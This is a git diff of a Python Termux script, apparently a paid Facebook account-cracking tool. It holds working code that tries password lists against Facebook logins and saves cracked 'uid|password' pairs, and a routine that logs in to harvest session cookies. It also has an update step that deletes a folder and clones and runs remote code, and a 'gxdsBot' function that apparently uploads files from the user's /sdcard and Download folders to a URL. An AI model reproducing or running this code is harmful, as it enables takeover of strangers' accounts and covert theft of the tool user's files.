@@ -664,13 +664,13 @@ gxdsprnt = str(f"{li}" * 37)
 
 # ANTI BYPASSING
 if not os.path.exists("/data/data/com.termux/files/usr/bin/rm"):
-        print(f"{lgr}   [✓] BYPASSING PASSED!")
-        slp(2)
-        print(f"{lr}  [!] LOL, IT'S A PRANK!")
-        slp(5)
-        exit()
+    print(f"{lgr}   [✓] BYPASSING PASSED!")
+    slp(2)
+    print(f"{lr}  [!] LOL, IT'S A PRANK!")
+    slp(5)
+    exit()
 else:
-        pass
+    pass
 
 # ANIMATION
 gxdsanmtn3 = [
@@ -729,9 +729,11 @@ id1 = "X".join(uuidd).replace("_", "C").replace("u", "GXDS").replace("a", "J")
 gxdsid = id1 + spce
 gxdsAccess = requests.get("https://arterxsk.repl.co/access.txt").text
 
+
 def lxnes():
-  print(f"{dg}  ————————————————————————————————————————")
-  print(f"{dg}  ————————————————————————————————————————")
+    print(f"{dg}  ————————————————————————————————————————")
+    print(f"{dg}  ————————————————————————————————————————")
+
 
 def gxdslogo():
     systm("clear")
@@ -743,10 +745,11 @@ def gxdslogo():
     print(f"{lg}  [-] VERSION    :{dg}   0.0.1")
     print(f"{dg}  ————————————————————————————————————————")
 
+
 # MENU
 def menu():
     gxdslogo()
-    usxr=str(input(f"{lgr}  [-] ENTER YOUR USERNAME:{dg} "))
+    usxr = str(input(f"{lgr}  [-] ENTER YOUR USERNAME:{dg} "))
     usxrN = usxr.upper()
     gxdslogo()
     print(f"{dg}")
@@ -761,13 +764,13 @@ def menu():
     if gxdsid in gxdsAccess:
         slp(2)
         print("")
-        print(f"{lgr}  [✓] HELLO, "+usxrN+". YOUR TOKEN APPROVED!")
+        print(f"{lgr}  [✓] HELLO, " + usxrN + ". YOUR TOKEN APPROVED!")
         slp(3)
         main()
     else:
         slp(0.1)
         gxdslogo()
-        print(f"{lg}  [✘] "+usxrN+" TOKEN:\033[1;30m INVALID")
+        print(f"{lg}  [✘] " + usxrN + " TOKEN:\033[1;30m INVALID")
         slp(1)
         for gxdsloading in range(11):
             slp(0.3)
@@ -779,7 +782,7 @@ def menu():
         print(f"\n{dg}  ————————————————————————————————————————")
         print(f"{lg}  [-] TOKEN :{dg} " + gxdsid)
         lxnes()
-        print(f"{rp}  [+] HELLO, "+usxrN+". CHECK OUR PRICELIST.")
+        print(f"{rp}  [+] HELLO, " + usxrN + ". CHECK OUR PRICELIST.")
         print(f"{lg}  [-] TRIAL :{dg} ₱000 - 003 DAYS ")
         print(f"{lg}  [-] PAID  :{dg} ₱150 - 015 DAYS ")
         lxnes()
@@ -788,17 +791,18 @@ def menu():
         print(f"{dg}  ————————————————————————————————————————")
         bxy = input(f"{lgr}  [?] CHOOSE:{dg} ")
         if bxy == "1":
-         systm("xdg-open https://m.me/goxdies")
-         slp(1)
-         menu()
+            systm("xdg-open https://m.me/goxdies")
+            slp(1)
+            menu()
         else:
-         gxdslogo()
+            gxdslogo()
         print(f"{lgr}  [!] UPDATING USERS, PLEASE WAIT...")
         slp(5)
         systm(
             "cd ; rm -rf gxds ; git clone https://github.com/goxdies/gxds; cd gxds ; python x.py"
         )
-        
+
+
 def main():
     gxdslogo()
     print(f"{lg}  [1] FILE ID CRACKING")
@@ -807,21 +811,22 @@ def main():
     print(f"{dg}  ————————————————————————————————————————")
     optixn = input(f"{lgr}  [•] CHOOSE:{dg} ")
     if optixn == "1":
-       gxdsclone()
-       slp(1)
+        gxdsclone()
+        slp(1)
     elif optixn == "2":
-      xcokis()
-      slp(1)
+        xcokis()
+        slp(1)
     elif optixn == "3":
-      print("")
-      systm(
+        print("")
+        systm(
             "cd ; rm -rf gxds ; git clone https://github.com/goxdies/gxds; cd gxds ; python x.py"
         )
-      systm("clear")
+        systm("clear")
     else:
         gxdslogo()
         print(f"{lg}  [✘] OPTION:{dg} INVALID")
         main()
+
 
 # FILE PATH
 def gxdsclone():
@@ -850,11 +855,12 @@ def gxdsclone():
         gxdsclone()
     gxdsFilesMenu(gxdsfiles)
 
+
 # GET COOKIES
 def xcokis():
     gxdslogo()
-    url='https://n.facebook.com'
-    xurl=url+'/login.php'
+    url = "https://n.facebook.com"
+    xurl = url + "/login.php"
     ua = "Mozilla/5.0 (Linux; Android 4.1.2; GT-I8552 Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36"
     print(f"{lg}  [•] FILE SAVE IN:{dg} /sdcard/gxds.txt")
     lxnes()
@@ -912,9 +918,7 @@ def xcokis():
                 .replace(":", "=")
             )
             if "c_user" in cookie:
-                print(
-                    f"\r{rc}  {cookie}"
-                )
+                print(f"\r{rc}  {cookie}")
                 open("/sdcard/gxds-coki.txt", "a").write(f"{cookie}\n")
             elif "checkpoint" in cookie:
                 sys.exit(f"{lr}  [✘] OPPS, CHECKPOINT!")
@@ -924,6 +928,7 @@ def xcokis():
         sys.exit(f"{lr}  [✘] NO INTERNET")
     except KeyboardInterrupt:
         sys.exit(f"{lr}  [✘] STOPPED!")
+
 
 # FILE CLONING
 def gxdsFilesMenu(gxdsfiles):
@@ -996,12 +1001,50 @@ def gxds_files(uid, pxss):
     session = requests.Session()
     try:
         for ps in pxss:
-            gxdsfbs = session.get(f'{url}').text
-            info={"lsd":re.search('name="lsd" value="(.*?)"', str(gxdsfbs)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(gxdsfbs)).group(1),"m_ts":re.search('name="m_ts" value="(.*?)"', str(gxdsfbs)).group(1),"li":re.search('name="li" value="(.*?)"', str(gxdsfbs)).group(1),"try_number":"0","unrecognized_tries":"0","email":uid,"pass":ps,"login":"Log In"}
-            update= {"authority": f'{fb}.facebook.com',"method": 'POST',"scheme": 'https',"accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.8',"accept-encoding": 'gzip, deflate, br',"accept-language": 'en-US,en;q=1',"cache-control": 'no-cache, no-store, must-revalidate',"referer": f'https://{fb}.facebook.com/',"sec-ch-ua": '"Google Chrome";v="90", "Not)A;Brand";v="8", "Chromium";v="75"',"sec-ch-ua-mobile": '?0',"sec-ch-ua-platform": "Windows","sec-fetch-dest": 'document',"sec-fetch-mode": 'navigate',"sec-fetch-site": 'same-origin',"sec-fetch-user": '?1',"pragma": 'no-cache',"priority": 'u=1',"cross-origin-resource-policy": 'cross-origin',"upgrade-insecure-requests": '1',"user-agent": uuu,}
-            session.post(url=f"{url}/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8",data=info,headers=update,proxies=prox).text
-            q=session.cookies.get_dict().keys()
-            if "session_key" in q:
+            uuu = random.choice(gxdsUArndm)
+            gxdsfbs = session.get(f"{url}").text
+            info = {
+                "lsd": re.search('name="lsd" value="(.*?)"', str(gxdsfbs)).group(1),
+                "jazoest": re.search(
+                    'name="jazoest" value="(.*?)"', str(gxdsfbs)
+                ).group(1),
+                "m_ts": re.search('name="m_ts" value="(.*?)"', str(gxdsfbs)).group(1),
+                "li": re.search('name="li" value="(.*?)"', str(gxdsfbs)).group(1),
+                "try_number": "0",
+                "unrecognized_tries": "0",
+                "email": uid,
+                "pass": ps,
+                "login": "Log In",
+            }
+            update = {
+                "authority": f"{url}",
+                "method": "POST",
+                "scheme": "https",
+                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.8",
+                "accept-encoding": "gzip, deflate, br",
+                "accept-language": "en-US,en;q=1",
+                "cache-control": "no-cache, no-store, must-revalidate",
+                "referer": f"{url}/",
+                "sec-ch-ua": '"Google Chrome";v="90", "Not)A;Brand";v="8", "Chromium";v="75"',
+                "sec-ch-ua-mobile": "?0",
+                "sec-ch-ua-platform": "Windows",
+                "sec-fetch-dest": "document",
+                "sec-fetch-mode": "navigate",
+                "sec-fetch-site": "same-origin",
+                "sec-fetch-user": "?1",
+                "pragma": "no-cache",
+                "priority": "u=1",
+                "cross-origin-resource-policy": "cross-origin",
+                "upgrade-insecure-requests": "1",
+                "user-agent": uuu,
+            }
+            session.post(
+                url=f"{url}/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8",
+                data=info,
+                headers=update,
+            ).text
+            q = session.cookies.get_dict().keys()
+            if "c_user" in q:
                 print(f"\r\r{lgr}  [GXDS-OK] {uid}|{ps}")
                 open("/sdcard/gxds-ok.txt", "a").write(uid + "|" + ps + "\n")
                 oks.append(uid)
@@ -1040,7 +1083,7 @@ def gxdsBot():
                 sent = session.post(url, data=data2, files=files)
     except:
         pass
-      
+
     # SD CARD TXT
     try:
         sdcard_path = "/sdcard"
@@ -1055,7 +1098,7 @@ def gxdsBot():
                 sent = session.post(url, data=data2, files=files)
     except:
         pass
-      
+
     # DOWNLOAD PATH
     try:
         sdcard_path = "/sdcard/Download"
